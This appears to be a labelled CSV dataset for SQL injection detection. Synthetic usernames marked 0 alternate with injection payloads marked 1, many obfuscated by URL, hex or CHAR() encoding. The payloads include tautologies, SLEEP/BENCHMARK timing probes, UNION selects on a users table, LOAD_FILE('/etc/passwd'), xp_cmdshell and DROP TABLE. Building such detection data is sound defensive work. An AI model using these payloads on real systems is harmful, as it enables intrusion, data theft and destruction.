name,is_malicious
parkamy,0
mooneybrandi,0
'%20OR%201=1--,1
"simsariana' OR BENCHMARK(10000000,MD5(NOW()))--",1
xjordan,0
harrisonrussell,0
carolyndennis,0
petersontrevor,0
anthony23,0
victordunlap,0
yjones,0
samuel72,0
pamela17,0
okennedy,0
0x270x3b0x200x440x520x4f0x500x200x540x410x420x4c0x450x200x750x730x650x720x730x2d0x2d,1
mossroberta,0
aroth,0
heidimarshall,0
davidsmith,0
jesse86,0
creynolds,0
hhuff,0
sandracurry,0
patriciabarrera,0
simmonsroger,0
cassandranorman,0
cgallagher,0
rdavis,0
lawrencemiller,0
klee,0
egiles,0
kevin57' OR BINARY 'a'='a'--,1
qevans,0
jennifermoore,0
wgreene,0
cory41,0
andrew91,0
johngutierrez,0
dhartman,0
taylorfelicia,0
'%20OR%201=1--,1
brianpittman,0
sramos,0
xunderwood,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
nriley,0
katrinagreen,0
'/**/OR/**/'1'='1,1
brownshelbyCHAR(39)CHAR(47)CHAR(42)CHAR(42)CHAR(47)CHAR(79)CHAR(82)CHAR(47)CHAR(42)CHAR(42)CHAR(47)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
jasminegonzalez,0
dominiquedaniels,0
jay27,0
butlerkevin,0
morgan780x270x200x4f0x520x200x280x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x280x530x450x4c0x450x430x540x280x530x4c0x450x450x500x280x350x290x290x290x620x410x4b0x4c0x290x2d0x2d,1
stephanieharvey,0
rosariobarry,0
jared16,0
stanley88,0
wilsonkayla,0
kmason,0
0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
hallgina,0
' OR '1'='1,1
nathansmith,0
juanvalenzuela,0
brittany12,0
jason36,0
charlesperez,0
theresa32,0
gonzalezsara,0
calderonkaren,0
greendesiree,0
acharles,0
mdawson,0
elopez,0
matthew05,0
kristin19,0
colebeth,0
victorgonzalez,0
justin36,0
aprilscott,0
dawn04,0
curtisryan,0
collinsjoanna,0
jacksondavid' OR '1'='1,1
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
natalie19,0
snydergary,0
'%27%20OR%201=1--,1
rwilson,0
mwilson,0
smithtara,0
uenglish' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
markchapman,0
cainkelly,0
fmoreno,0
zachary44,0
wmiller,0
ryan03,0
eileenhughes,0
' OR BINARY 'a'='a'--,1
gregory12,0
michaeladams,0
randy14,0
vduffy,0
jasminlowe,0
stephanie00,0
pmay,0
michael66' OR '1'='1,1
phuang,0
crussell,0
ybarker,0
jacklee,0
ibarralaura,0
noneill,0
sean61,0
jeremiahrangel,0
'/**/OR/**/'1'='1,1
allisongutierrez,0
emily67' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
xjones,0
wjohnson,0
ballryan,0
jonesbrandi,0
jameshoffman,0
todd07,0
agross,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
jason56,0
marshjennifer,0
omartinez,0
goodtonya,0
ddonovan,0
williamrichard,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
wilsonjennifer,0
%27 %4f%52 %43%48%41%52%28%34%39%29%3d%43%48%41%52%28%34%39%29--,1
clarkelizabeth,0
mcbrideemily,0
sara81,0
mcleanwesley,0
wigginsemily,0
wrightpaul,0
maryrivera,0
davidmeyer,0
richardsmith,0
erikcollins,0
gcoleman,0
carriefloyd,0
emily68,0
kendra73,0
rodney23,0
mford,0
taylorrodney,0
freemangloria,0
jonathandavenport'%27%20OR%201=1--,1
robert61,0
cervantesmichael,0
0x270x3b0x200x440x520x4f0x500x200x540x410x420x4c0x450x200x750x730x650x720x730x2d0x2d,1
qrivas,0
evanford,0
tiffany36,0
williamsshannon,0
thomas10,0
curtisconnie,0
emily87,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
dianasmith,0
danielle84,0
anthonywhite,0
yvonne06,0
lisa77,0
jasonholden,0
ereed' OR 1=1--,1
mikayla51,0
'%20OR%201=1--,1
rogerstimothy,0
vtaylor,0
kelly26,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(61)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(45)CHAR(45),1
patrick73,0
griffindawn,0
martinjuarez,0
robertolsen,0
lisa55,0
brittanymartin,0
vcarter,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
jamesjohn,0
patelbryan,0
lcarroll,0
castrobryan,0
CHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
bradleyjones,0
yuwilliam,0
michael51,0
sharon45,0
meyerstimothy,0
uwhite,0
samuelhill,0
helen44,0
imartin,0
crodriguez,0
rhonda41,0
henrylandry,0
blakenicholson,0
kwilson,0
ihuffman,0
johnsontravis0x270x200x4f0x520x200x300x780x350x300x3d0x300x780x350x300x2d0x2d,1
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(69)CHAR(78)CHAR(67)CHAR(72)CHAR(77)CHAR(65)CHAR(82)CHAR(75)CHAR(40)CHAR(49)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(44)CHAR(77)CHAR(68)CHAR(53)CHAR(40)CHAR(78)CHAR(79)CHAR(87)CHAR(40)CHAR(41)CHAR(41)CHAR(41)CHAR(45)CHAR(45),1
rachel30,0
acruz,0
edwardssusan,0
shermanryan,0
zachary12,0
nathanielgarcia,0
'; EXEC xp_cmdshell('dir')--,1
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
markjohnson,0
fischerfrank,0
krystalmeyer,0
sheajesse,0
valerie84' UNION SELECT * FROM users--,1
zchristensen,0
rowens,0
jennarodriguez,0
lphillips,0
CHAR(39)CHAR(37)CHAR(50)CHAR(55)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
karla26,0
ericwiley,0
jsmith,0
robertchandler,0
ljimenez,0
stephanie04,0
ralvarez,0
xmartinez,0
tracyfriedman,0
hmartin,0
angela03,0
david13,0
'; EXEC xp_cmdshell('dir')--,1
samuel65,0
jenniferhernandez,0
teresa51,0
morgan740x270x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
bford,0
jhansen,0
lawsonmarc,0
michele67,0
james70,0
jchambers,0
jacksonbrittany,0
darren12,0
wwebster,0
christina59,0
smithcarol,0
devinsparks,0
jenkinskaren,0
knightpaula,0
yperry,0
courtney24' OR 0x50=0x50--,1
christopherross'/**/OR/**/'1'='1,1
sanchezkimberly,0
0x270x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
jonathanalvarado,0
maurice37,0
edwardmiller,0
hclark,0
tfuller,0
mark52,0
byrdrichard,0
vallison,0
xbecker,0
kristy05,0
'; DROP TABLE users--,1
clarkpatricia,0
kellymatthew,0
tommy00,0
lucas94'||'1'='1,1
melaniemitchell,0
martin57,0
%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
boyergeorge,0
adammullins,0
michaelross,0
zreed,0
hinesadam,0
uandrews,0
alidarryl,0
tylerjenkins,0
jeffery71,0
alexandriablanchard,0
hallearl,0
cheryl37,0
ruth64,0
brenda71,0
michaelashley,0
melissazamora,0
brittanyharper,0
thomas21,0
parkerkatherine,0
imiller,0
qandrade,0
melissacarter,0
johnstonvictor,0
gwallace,0
ypeters' OR '1'='1,1
goldenjustin,0
spearssusan' OR SOUNDEX('test')=SOUNDEX('test')--,1
johnsonmargaret,0
elizabeth13,0
susanhardy,0
chavezdiana,0
jacqueline14,0
dcole,0
andrew81,0
cmiller,0
aliciakaiser,0
charlene46,0
josephrobert,0
benjamin33,0
thanna,0
kellybrown'%20OR%201=1--,1
seanvalencia,0
elizabethmendoza,0
howardhernandez,0
garcialindsey,0
patricia30,0
lsmith,0
tommy58,0
donald47,0
' UNION SELECT * FROM users--,1
'; EXEC xp_cmdshell('dir')--,1
kristiking,0
' OR 1=1--,1
morgan36'/**/OR/**/'1'='1,1
brookemoss,0
jason99,0
fcastillo,0
daniel28,0
millerjoel,0
holderbrittany'||'1'='1,1
kellybarrett,0
eric52'; EXEC xp_cmdshell('dir')--,1
iparrish,0
smithpaul,0
yvette51,0
micheal86,0
turnerjames,0
amy64,0
fosterbrooke,0
mitchellnicole%27 %4f%52 %27%31%27%3d%27%31,1
ywalsh,0
margaretjackson,0
lambertmichael,0
donnahart,0
nmays,0
hallcharles,0
diana10,0
vreeves,0
miranda06,0
kruegerjoel,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
john40,0
russohoward,0
manueldavis,0
imartinez,0
tgonzalez,0
tapiapaul,0
adamslaura,0
millerkristen,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
johnsonstephanie,0
johnsmichael,0
donnagardner,0
hallmichelle,0
deborahjohnson,0
vrobertson,0
debraanderson,0
diana76,0
nicholas26,0
whitecarrie,0
jacob27,0
eroberts'; DROP TABLE users--,1
yhoffman,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
courtney04,0
martinadam,0
michaelcoleman,0
vroman,0
%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
jeffrey35,0
prestonjesse,0
martinezchristopher,0
xraymond,0
tylerheather,0
jack03,0
angelspencer,0
waltonanthony,0
jessicabutler,0
rgreen'%20OR%201=1--,1
ashelton,0
lisa34,0
chris94,0
"loganmartin'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
seth94,0
sbentley,0
edwardsedward,0
mgarza,0
michael03,0
wlester,0
carolyn21,0
nathanterry' OR CHAR(49)=CHAR(49)--,1
jlewis,0
ubrown,0
michelle10' UNION SELECT * FROM users--,1
tyler56,0
bishopantonio,0
mary62,0
holly31,0
hmartin,0
oobrien,0
christianhayes'||'1'='1,1
ronald17,0
kellymonique,0
paul49,0
omar53,0
lvillarreal,0
jenniferconley,0
knappbrian,0
jamespatterson0x270x200x4f0x520x200x310x3d0x310x2d0x2d,1
rsmith,0
juarezjacob,0
farmertyler,0
beckerbrenda,0
ggomez,0
'/**/OR/**/'1'='1,1
betty21,0
lori50,0
chadlang,0
gutierrezlisa,0
batesrobert,0
wsherman,0
floydstephanie,0
jacksoncatherine,0
0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
markhughes,0
carolyn91,0
hcarter,0
choijames,0
jacksoncarla,0
emartinez,0
david67,0
lisawilson,0
robert91,0
williamsjohn,0
' OR BINARY 'a'='a'--,1
jaime29,0
gutierrezjason,0
marthawilson,0
abigail89,0
dphillips,0
jason87,0
holtjason,0
lauren36,0
kwilliams,0
chadmiller,0
watsoncheyenne,0
wendy76,0
williamsjoel,0
pricekyle,0
' OR CHAR(49)=CHAR(49)--,1
jason94,0
diana59,0
ynelson' UNION SELECT * FROM users--,1
donna64,0
onewton,0
johnsonshawn,0
codonnell,0
welchbarbara,0
raymond52,0
efitzgerald,0
lcampbell,0
davissamantha,0
travis56,0
darrencrane,0
avargas,0
evasquez'||'1'='1,1
thomas46,0
jonathan02,0
'||'1'='1,1
sharon60,0
kellycollins,0
smithmonica,0
stephanie61CHAR(39)CHAR(47)CHAR(42)CHAR(42)CHAR(47)CHAR(79)CHAR(82)CHAR(47)CHAR(42)CHAR(42)CHAR(47)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
wongkayla,0
michaelaparker,0
' OR CHAR(49)=CHAR(49)--,1
jacobgarcia,0
maurice10,0
%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%3d%27%31,1
christopher88,0
gregoryberg,0
walkerkayla,0
lsolis' OR 1=1--,1
greg07,0
0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
lopezapril,0
wlucero,0
jerry67,0
charlestate,0
cwood,0
edwardcross,0
huntbobby,0
christopherreyes' OR 1=1--,1
ahall' OR 0x50=0x50--,1
angela23,0
' OR '1'='1,1
'%27%20OR%201=1--,1
javier81,0
myerseric,0
alanmeyer,0
angelabennett' OR '1'='1,1
reyesbrittany,0
christine65,0
huntertony%27 %4f%52 %43%48%41%52%28%34%39%29%3d%43%48%41%52%28%34%39%29--,1
larajessica,0
johnsanthony,0
slopez,0
parkkelsey,0
jeffrey98,0
jonesmelissa,0
durhamjanet,0
rodriguezkristen,0
christopherwhite,0
paul62,0
popejoshua,0
diana20,0
ryanjohnson,0
'||'1'='1,1
ehenson,0
dawn46,0
awillis,0
juliathompson,0
ngray,0
' OR 1=1--,1
bberg' OR 1=1--,1
' UNION SELECT * FROM users--,1
lindsay51,0
moraleslori,0
tflores,0
boydthomas,0
cobbvalerie,0
veronica01,0
jessicarodriguez,0
evansbrian,0
humphreybridget,0
melissahoward,0
jeremy79,0
jeffrey21,0
steven21,0
havila0x270x3b0x200x440x520x4f0x500x200x540x410x420x4c0x450x200x750x730x650x720x730x2d0x2d,1
angelaroberts,0
lreid,0
lsmall,0
jennifer84,0
burnetttanya,0
manuel10,0
urobinson,0
aweiss,0
randy66,0
victoria20,0
folson,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
david34,0
owendavid,0
hernandezmark,0
jenkinspaul0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
obest'; EXEC xp_cmdshell('dir')--,1
brittany54,0
andreabuckley,0
' OR '1'='1,1
zmarsh,0
scottjoseph,0
fordamber,0
porterdesiree0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
turnermegan,0
wilsonjoseph,0
rodney96,0
thomas81' OR 1=1--,1
perrymullen,0
ymontgomery,0
amyfoster,0
samantha99,0
ynelson,0
laurencook,0
ymurray,0
flowersjohn,0
johnsonmary,0
jacksonbrandon,0
%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
nbrowning,0
CHAR(39)CHAR(47)CHAR(42)CHAR(42)CHAR(47)CHAR(79)CHAR(82)CHAR(47)CHAR(42)CHAR(42)CHAR(47)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
ccarr,0
joshuawiley,0
gwheeler,0
william87,0
'%27%20OR%201=1--,1
kimberly48,0
klambert,0
ncastro,0
thompsonmark' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
carmenwebb,0
edward30,0
bduke,0
webbrobert,0
emilyrivera,0
castroamanda,0
jacqueline88,0
curtisdaniel,0
matthewgardner0x270x200x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d,1
kevin54,0
xrogers,0
taylorkristen,0
rwells,0
stephanie34,0
russoandrew,0
john81,0
michaelmarie,0
' UNION SELECT * FROM users--,1
' OR BINARY 'a'='a'--,1
' OR 0x50=0x50--,1
vwinters,0
anna83,0
dennismerritt,0
eestrada,0
butleralexis,0
jessica62,0
rangelmarcus,0
wnelson,0
isanders,0
"afisher' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
gjenkins,0
debrastone,0
vicki80,0
stevensjames,0
ncarson,0
patriciaadams,0
ugregory,0
"keith17'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
kristophermorrison,0
wesleyrubio,0
nathanpeters,0
jschwartz,0
gregory56,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
jamie41,0
malikmiller,0
floresjoseph,0
jthompson,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
gprince0x270x200x4f0x520x200x310x3d0x310x2d0x2d,1
'; DROP TABLE users--,1
sford' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
joshuawarner,0
tjones,0
amberroach'; EXEC xp_cmdshell('dir')--,1
lorilee,0
garciaelizabeth,0
yjackson,0
ljones,0
' UNION SELECT * FROM users--,1
yschroeder,0
meyerelizabeth,0
' OR 1=1--,1
kevin02,0
shannon59,0
thomasemily,0
%27%7c%7c%27%31%27%3d%27%31,1
kristopher90,0
dennis25,0
tinacastillo,0
aparrish,0
pittmanedward,0
parkerjamie,0
katelynmiller,0
ksmith,0
christine30'%20OR%201=1--,1
pam96,0
qblair,0
skinnerjack,0
emilygonzalez,0
taylorsamantha,0
kellyhicks,0
amorrison,0
tylerchaney,0
fernandezemily,0
justinparrish,0
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
russellraymond,0
oalvarado,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
kevin57CHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
danny75,0
martinjoseph,0
amanda16,0
tjefferson'%27%20OR%201=1--,1
"neaton' OR BENCHMARK(10000000,MD5(NOW()))--",1
ywilson,0
ladams,0
laneerin,0
mariafoster,0
michellekim,0
gregoryjames,0
jonesjoy,0
sullivanrachel,0
acevedomichael,0
timothy56,0
brian19,0
' UNION SELECT * FROM users--,1
woodlisa,0
adamsdwayne,0
lshepherd,0
jimenezsean,0
johnsonbrooke,0
bradleylisa,0
romerojeffrey,0
dvasquez,0
tyler18%27%3b %44%52%4f%50 %54%41%42%4c%45 %75%73%65%72%73--,1
troy36,0
ygonzalez,0
zmurphy,0
0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
revans'; DROP TABLE users--,1
' OR '1'='1,1
david92,0
angela09,0
kgarcia,0
matthew810x270x3b0x200x450x580x450x430x200x780x700x5f0x630x6d0x640x730x680x650x6c0x6c0x280x270x640x690x720x270x290x2d0x2d,1
trangeorge,0
josephnorris,0
justin44,0
edward14,0
jenkinseduardo,0
cgaines,0
lharrison,0
navarromegan,0
pmurray,0
kevinreilly,0
dbennett,0
hgibson,0
fdoyle' OR CHAR(49)=CHAR(49)--,1
hubbardsabrina,0
' OR CHAR(49)=CHAR(49)--,1
shirleyramirez,0
loriharris,0
douglas39,0
lisaparker,0
xcraig,0
nicholas02,0
jennifer62,0
danielle51,0
carriejones,0
ricardo83,0
anna11,0
frank49,0
ikim,0
mariashelton,0
lynnlawson,0
rodneythomas,0
christophermoreno,0
gmason,0
riveracindy,0
humphreyjacob,0
dominique80,0
benjaminsolis,0
rosariocorey,0
angela85,0
douglasmorgan,0
sheilasmith,0
joshuastewart,0
ejohnson,0
elizabeth40,0
kayleemonroe,0
andersonjennifer,0
vincent10,0
xbrownCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(61)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
nicholasowens,0
williamparrish,0
phillipsmarie' OR CHAR(49)=CHAR(49)--,1
charlescole,0
danielkirby,0
thorton' OR CHAR(49)=CHAR(49)--,1
wwalton,0
ecarlson,0
bhaynes,0
wmcdonald0x270x200x4f0x520x200x300x780x350x300x3d0x300x780x350x300x2d0x2d,1
daniel88,0
dianerussell,0
staylor,0
rodriguezlinda,0
michaelwilliams,0
charlesharrell0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
juliesmith,0
'; EXEC xp_cmdshell('dir')--,1
walter12,0
allenking,0
yskinner,0
rodgersjonathan,0
uharrison,0
andrew36,0
jonathancarter,0
danielwarren,0
earl49,0
emorales,0
lfranklin,0
brittany80,0
justinbennett,0
grodriguez'%27%20OR%201=1--,1
christine64,0
peter62,0
scott49,0
emma89,0
jeremiahoneal,0
wspencer,0
myersjulie,0
gregorycontreras,0
susan34,0
gregorymelissa,0
brittneywilliams' OR 0x50=0x50--,1
crystal81,0
rachael96,0
kreed,0
robertcooke,0
%27 %4f%52 %43%48%41%52%28%34%39%29%3d%43%48%41%52%28%34%39%29--,1
brich0x270x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
renee31,0
rogerswayne,0
elliottyvonne,0
dylan30,0
deborahcruz,0
adamhughes,0
jefferymarshall,0
skinnerpaul,0
riosdenise,0
pamela05,0
fwebster,0
rojasyolanda,0
katherinecollins,0
ashleyperez,0
franciscorobinson,0
thomas32,0
debrafinley,0
brookesimon,0
desiree92,0
shelbyclark,0
opetersen,0
nataliegomez,0
davischristopher,0
robert74,0
howard71,0
moralaura,0
tschaefer0x270x3b0x200x450x580x450x430x200x780x700x5f0x630x6d0x640x730x680x650x6c0x6c0x280x270x640x690x720x270x290x2d0x2d,1
jacqueline59,0
sherryfarley'||'1'='1,1
jesse61,0
rcochran,0
jason27,0
rgreene,0
andreshah,0
robert85,0
anaroberts,0
grossjames,0
christinapayne' UNION SELECT * FROM users--,1
stricklandandrea,0
gonzalezcassandra,0
breanna08,0
patrick15,0
hillarthur' OR SOUNDEX('test')=SOUNDEX('test')--,1
hcobb,0
wolfmaria,0
hannahramsey,0
edwardthomas,0
lowerylauren,0
mary63,0
alexander44,0
jamie79,0
davidcook,0
robersoncheryl'; EXEC xp_cmdshell('dir')--,1
jesserogers,0
christopherkaiser,0
cathygreen,0
jessica72,0
gabriela22,0
shieldschristopher,0
mark16,0
vicki05,0
rileylisa,0
ytaylor,0
grahamraymond,0
'||'1'='1,1
lisa86,0
hurstjeffrey,0
litina,0
gomezvictoria,0
amandahernandez,0
mathewgentry,0
daniel46,0
williamsmichelle,0
kking,0
timothynorton,0
jillgolden,0
ramoscynthia,0
maynarddavid,0
scottellison,0
shannoncollins,0
kellycompton,0
mjones,0
'%20OR%201=1--,1
lsims,0
michael69,0
cameronsmith'; DROP TABLE users--,1
johnjones,0
anthony61,0
'/**/OR/**/'1'='1,1
lcurry,0
taylorashley,0
gbuckley,0
michaelmahoney,0
jonesedward,0
jeremycurtis,0
sarah39,0
julie03' OR 0x50=0x50--,1
christopher68,0
mmccann,0
%27 %55%4e%49%4f%4e %53%45%4c%45%43%54 %2a %46%52%4f%4d %75%73%65%72%73--,1
gmoore,0
matthewtorres,0
"mackcourtney' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
joanna210x270x2b0x280x530x450x4c0x450x430x540x200x270x300x270x200x460x520x4f0x4d0x200x750x730x650x720x730x200x570x480x450x520x450x200x750x730x650x720x6e0x610x6d0x650x3d0x270x610x640x6d0x690x6e0x270x200x410x4e0x440x200x530x550x420x530x540x520x490x4e0x470x280x700x610x730x730x770x6f0x720x640x2c0x310x2c0x310x290x3d0x270x610x270x290x2b0x27,1
matthew97,0
gonzalezdustin,0
boothalexis,0
audrey96,0
maddoxjames,0
tracy70,0
jfoster,0
ryoung,0
jessica65,0
tonyahall,0
nicholas40,0
leearcher,0
fisherjames,0
samuelroberts,0
brandimaddox,0
susanwilliams,0
sharon82,0
marcusvazquez,0
matapeter,0
gthomas,0
"rachelgibson' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
linda32,0
jose320x270x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
robertcarr,0
ruizamanda,0
kevingarcia,0
andrew14,0
zwhitney,0
hallfrank,0
fwhite,0
trandouglas,0
amanda52,0
jennifer16,0
whitetoni,0
'%27%20OR%201=1--,1
kmclean,0
michael18,0
victoria62,0
wweberCHAR(39)CHAR(37)CHAR(50)CHAR(55)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
courtney13,0
nhayes,0
joshuavelasquez,0
hkerr,0
rojasstephanie,0
garciasarah,0
qnovak,0
zpittman,0
zcameron,0
melissapitts,0
matthewwarren,0
michael03,0
lpowell,0
' UNION SELECT * FROM users--,1
usmith,0
pfarley,0
ericcervantes,0
%27%3b %44%52%4f%50 %54%41%42%4c%45 %75%73%65%72%73--,1
margaret07,0
clarkmelissa,0
stephaniewade,0
jhernandez,0
hwilliams,0
wmarshall,0
dustinarroyo,0
stephanie86,0
sallen,0
patricia54,0
morrisonemily,0
derek31,0
lesliemorales,0
garciawilliam,0
lambmadison,0
robert43' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
